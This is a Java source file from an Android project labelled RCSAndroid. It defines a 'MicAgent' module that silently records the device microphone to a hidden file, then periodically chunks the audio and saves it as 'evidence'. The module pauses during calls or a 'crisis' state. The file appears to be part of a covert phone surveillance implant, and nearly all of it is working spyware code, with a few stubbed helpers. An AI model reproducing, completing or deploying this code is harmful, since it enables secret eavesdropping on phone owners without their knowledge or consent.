/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import java.io.IOException;

import android.media.MediaRecorder;
import android.util.Log;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.StateRun;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent.
 * 8000KHz, 32bit
 * 
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 *       Recipe: Recording Audio Files Recording audio using MediaRecorder is
 *       similar to playback from the previous recipe, except a few more things
 *       need to be specified (note, DEFAULT can also be used and is the same as
 *       the first choice in these lists): n MediaRecorder.AudioSource: n
 *       MICÑBuilt-in microphone n VOICE_UPLINKÑTransmitted audio during voice
 *       call n VOICE_DOWNLINKÑReceived audio during voice call n
 *       VOICE_CALLÑBoth uplink and downlink audio during voice call n
 *       CAMCORDERÑMicrophone associated with camera if available n
 *       VOICE_RECOGNITIONÑMicrophone tuned for voice recognition if available n
 *       MediaRecorder.OutputFormat: n THREE_GPPÑ3GPP media file format n
 *       MPEG_4ÑMPEG4 media file format n AMR_NBÑAdaptive multirate narrowband
 *       file format Audio 157 158 Chapter 6 Multimedia Techniques n
 *       MediaRecorder.AudioEncoder: n AMR_NBÑAdaptive multirate narrowband
 *       vocoder The steps to record audio are 1. Create an instance of the
 *       MediaRecorder: MediaRecorder m_Recorder = new MediaRecorder(); 2.
 *       Specify the source of media, for example the microphone:
 *       m_Recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 3. Set the
 *       output file format and encoding, such as:
 *       m_Recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 *       m_Recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 4. Set
 *       the path for the file to be saved: m_Recorder.setOutputFile(path); 5.
 *       Prepare and start the recording: m_Recorder.prepare();
 *       m_Recorder.start(); These steps for audio recording can be used just as
 *       they were in the previous recipe for playback.
 * @author zeno
 */
public class MicAgent extends AgentBase {

	private static final long MIC_PERIOD = 5000;
	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };

	private static final String TAG = "MicAgent";

	/** The recorder. */
	MediaRecorder recorder;
	StateRun state;
	Object stateLock = new Object();

	private int numFailures;

	private long fId;
	private String currentRecFile;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		try {
			synchronized (stateLock) {
				if (state != StateRun.STARTED) {
					addPhoneListener();
					recorder = new MediaRecorder();
					startRecorder();
					Log.d("QZ", TAG + "started");
				}
				state = StateRun.STARTED;
			}
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void addPhoneListener() {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		synchronized (stateLock) {
			if (state == StateRun.STARTED) {
				removePhoneListener();

				// #ifdef DBC
				Check.ensures(state != StateRun.STOPPED, "state == STOPPED");
				// #endif
				saveRecorderEvidence();
				stopRecorder();
				recorder.release();
				recorder =null;
			}
			state = StateRun.STOPPED;

		}
		Log.d("QZ", TAG + "stopped");

	}

	private void saveRecorderEvidence() {
		// #ifdef DBC
		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
		// #endif

		final byte[] chunk = getAvailable();

		if (chunk != null && chunk.length > 0) {

			int offset = 0;
			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				offset = AMR_HEADER.length;
			}
			byte[] data;
			if (offset == 0) {
				data = chunk;
			} else {
				data = Utils.copy(chunk, offset, chunk.length - offset);
			}

			new LogR(EvidenceType.MIC, getAdditionalData(), data);

		} else {
			Log.d("QZ", TAG + "zero chunk ");
			numFailures += 1;
		}
	}

	private byte[] getAvailable() {
		AutoFile file = new AutoFile(currentRecFile);
		return file.read();
	}

	private void removePhoneListener() {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(final byte[] conf) {
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		synchronized (stateLock) {
			if (state == StateRun.STARTED) {

				Log.d("QZ", TAG + " (go): max amplitude=" + recorder.getMaxAmplitude());
				if (numFailures < 10) {
					stopRecorder();
					saveRecorderEvidence();
					restartRecorder();

				} else {
					Log.d("QZ", TAG + "numFailures: " + numFailures);
					suspend();
				}

				if (callInAction()) {
					Log.d("QZ", TAG + "phone call in progress, suspend!");
					suspend();

				} else if (Status.self().crisisMic()) {
					Log.d("QZ", TAG + "crisis, suspend!");
					suspend();
				}
			}
		}
	}

	private void restartRecorder() {
		try {
			
			startRecorder();
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private boolean callInAction() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Start recorder.
	 * 
	 * @throws IllegalStateException
	 *             the illegal state exception
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	private void startRecorder() throws IllegalStateException, IOException {

		final DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();
		numFailures = 0;

		currentRecFile = Path.hidden() + "currentRec";
		
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		
		recorder.setOutputFile(currentRecFile);
		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	// SNIPPET
	/**
	 * Stop recorder.
	 */
	private void stopRecorder() {
		if (recorder != null) {
			recorder.stop();
			recorder.reset(); // You can reuse the object by going back to
								// setAudioSource() step
			//recorder.release(); // Now the object cannot be reused
		}
	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		// LOG_AUDIO_CODEC_SPEEX 0x00;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		// #ifdef DBC
		Check.ensures(additionalData.length == tlen, "Wrong additional data name");
		// #endif
		return additionalData;
	}
}
